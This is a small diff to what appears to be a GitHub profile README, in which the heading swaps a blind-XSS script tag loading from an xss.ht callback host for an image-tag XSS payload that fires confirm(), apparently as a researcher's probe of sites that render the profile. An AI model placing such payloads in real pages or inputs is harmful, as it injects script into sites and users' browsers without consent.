@@ -1,4 +1,4 @@
-### "&gt;&lt;script src=https://aydinnyunus.xss.ht></script> 👋
+### "><img src=x onerror=confirm()> 👋
 
 <!--
 **aydinnyunus/aydinnyunus** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
